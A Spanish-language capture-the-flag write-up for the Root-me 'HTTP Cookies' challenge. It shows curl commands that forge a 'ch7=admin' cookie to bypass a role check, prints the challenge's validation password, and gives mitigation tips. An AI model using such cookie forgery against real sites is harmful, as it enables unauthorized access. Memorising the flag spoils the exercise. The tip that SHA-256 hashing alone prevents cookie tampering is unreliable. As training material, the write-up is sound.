Root-me Write-up: HTTP Cookies
Análisis Inicial
Comenzamos realizando un muestreo general de la web mediante un curl. Al analizar la respuesta del servidor, observamos que se nos asigna automáticamente una cookie de sesión que nos identifica como un usuario sin privilegios.

```Bash

curl -L -v http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
Observaciones en la respuesta HTTP:

Encabezado: < Set-Cookie: ch7=visiteur

Comentario en el HTML: ``

Mensaje de error: "You need to be admin"
```
Identificación de la Vulnerabilidad
El sistema confía ciegamente en el valor de la cookie ch7 enviada por el cliente para determinar el rol del usuario. Al ver el comentario en el código fuente y el parámetro ?c=visiteur en la URL, deducimos que el valor esperado para obtener privilegios es admin.

Explotación
Para evadir la restricción, enviamos una petición modificando manualmente la cabecera Cookie para suplantar la identidad del administrador. También ajustamos el parámetro de la URL a ?c=admin:

```Bash

curl -H "Cookie: ch7=admin" "http://challenge01.root-me.org/web-serveur/ch7/?c=admin"
Resultado:
```
```HTML

<div>Validation password : ml-SYMPA</div>
Recomendaciones de Seguridad (Mitigación)
Eliminar comentarios sensibles: Nunca se deben dejar pistas sobre la lógica de autenticación o nombres de cookies en los comentarios del código fuente HTML.

Integridad de las Cookies: Las cookies de sesión no deben almacenarse en texto plano. Se deben utilizar algoritmos de hashing (SHA-256) o firmas criptográficas (como en los tokens JWT) para evitar que el usuario pueda modificarlas.
```
